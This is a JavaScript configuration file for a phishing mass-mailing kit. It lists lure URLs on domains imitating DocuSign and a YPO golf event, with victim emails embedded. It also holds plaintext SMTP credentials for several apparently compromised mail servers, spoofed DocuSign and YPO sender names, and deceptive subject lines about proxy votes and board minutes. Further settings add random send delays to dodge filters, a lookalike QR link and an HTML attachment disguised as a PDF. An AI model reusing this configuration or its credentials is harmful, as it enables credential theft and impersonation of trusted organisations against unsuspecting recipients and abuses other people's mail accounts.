module.exports = {

// Multiple Random Link
link : [
    'https://gokturkvilla.com/ypo-golf/schedule.html?folder=10CHAR&forum=BASE64EMAIL',
    // 'https://7sevensport.com/ypo-golf/schedule.html?folder=10CHAR&forum=BASE64EMAIL',
    'https://tarjumantimes.co.uk/ypo-golf/schedule.html?folder=10CHAR&forum=BASE64EMAIL',
    // 'https://docusigner.pages.dev/EmailStart?folder=20CHAR&ledge#XXXEMAIL',
    // 'https://dsesign.pages.dev/EmailStart?folder=20CHAR&ledge#XXXEMAIL',
    // 'https://docusigndse.pages.dev/EmailStart?folder=20CHAR&ledge#XXXEMAIL',
    // 'https://docusignengines.pages.dev/EmailStart?folder=20CHAR&ledge#XXXEMAIL',
    // 'https://docusigning.pages.dev/EmailStart?folder=20CHAR&ledge#XXXEMAIL',
    // 'https://docsignengine.pages.dev/EmailStart?folder=20CHAR&ledge#XXXEMAIL',
    // 'https://docsengine.pages.dev/EmailStart?folder=20CHAR&ledge#XXXEMAIL',
],


// Set Multiple SMTPS
smtpConfigs : [
    // "outbound.mailhop.org|465|nexacapital|Recasan098*",
    // "mail.molecularconnections.com|465|jignesh@molecularconnections.com|chayya2705",
    // "syrahtrading-com.mail.protection.outlook.com|25",
    // "mail.job4u.ae|587|accounts@job4u.ae|Cherokee@0303"
    // "mail.asl.vt.it|25",
    "smtp.mail.me.com|587|obrien.stanford70@icloud.com|hqcl-ysau-vbhh-gzuo"
],


// Add Multiple Sender Names (As much as you want) e.g  DocuSign Systems <dse@docusign.com>
fromNames : [
    'beddellis <obrien.stanford70@icloud.com>',
    // 'YPO Golf Forum <ypoforums.USER@job4u.ae>',
    // 'YPO Forums <ypoforums.USER@job4u.ae>',
    // 'YPO GLOBAL <ypoforums.USER@job4u.ae>',
    // 'YPO Golf Outings <ypoouting.USER@job4u.ae>',
    // 'DocuSign Communications <USER.DOMs@job4u.ae>',
    // 'DocuSign Communications via DOMC <USER.DOMs@job4u.ae>',
    // 'DocuSign via DOMC <USER.DOMs@job4u.ae>',
    // 'Docu#5NUMBER via Sharefile Portal <USER.DOMs@job4u.ae>',
    // 'DocuSign | DOMC <USER.DOMs@job4u.ae>',
    // 'YPO Global Chairman Desk  <communique@molecularconnections.com>',
    // 'YPO Global Directive  <communique@molecularconnections.com>',
     // ... add more names as needed
],


// Add Multiple Subjects (As much as you want) e.g .. e_Sign:Draft BOD Meeting Updates - DATEONLY2
subjects : [
    "blemeskis"
    // 'Exclusive: YPO December Golf Outing Schedule',
    // 'Exclusive Peek: YPO Holiday Golf Schedule - Mark Your Calendars!',
    // 'Golf, Gala, and Holiday Glitz: Join YPO\'s December Outing!',
    // 'Exclusive Invitation: YPO\'s Holiday-Themed Golf Extravaganza!',
    // 'Festive Fairways: Your Invitation to YPO\'s Holiday Golf Events!',
    // 'Fore the Holidays: Review Special Forum Golfing Schedule!',
    // 'YPO\'s December Golf Delight: Reserve Your Tee Time!'
    // "Please Action — Annual Meeting of Members",
    // "LMeise",
    // "Board Minutes and schedules for DOMC's upcoming meetings",
    // "Board Minutes and DOMC Financial Report 2023",
    // "DOMC's Financials September",
    // "Upcoming board meeting minutes and New motions for DOMC",
    // "Some stakeholders are still yet to Complete, Please endorse documents with your esignature",
    // "Notice: Complete & Sign Via-Edoc: #4 - DOMC - FULLDATE1",
    // "Action Required: Designate Your Proxy for the Upcoming YPO Meeting",
    // "Your Proxy Designation Needed for YPO Annual Meeting",
    // "Important Notice: Proxy Designation Required for YPO’s Annual Gathering",                    

    // ... add more subjects as needed
],

// should delay be enabled?
doSleep : true,
 // YOUR_DELAY_IN_SECONDS between each email. This Generates a random duration between 1 and the supplied number
sleepTime : 20, 

// Enable Image Attachment (true or false)
includeImageAttachment : false, 

// Enable QR Code Image (true or false)
includeQRCode : false,

// Enable Html Attachment (true or false)
includeHtmlAttachment : false,


// Do Not Touch This
autoEmail : "default@domain.com",

// Set QR Code Link
QRlink : `https://ypmsft.com/M`,


//Image Attachment Filename
imageAttachmentFilename : "docusign-image.png",

//Image Attachment File Path
imageAttachmentFile : "/tms.png",

//Image Attachment cid (to be used in your letter)
imageAttachmentCID : "image-cid",

//QR Code Image Name
qrCodeFilename : "telblies.jpeg",

//QR Code cid (to be used in your letter)
qrCodeCID : "QRC",

//HTML Attachment File Name
htmlAttachmentFilename : "Financial Report.pdf.html",

//HTML Attachment File Path
htmlAttachmentFile : "/vm.html",

};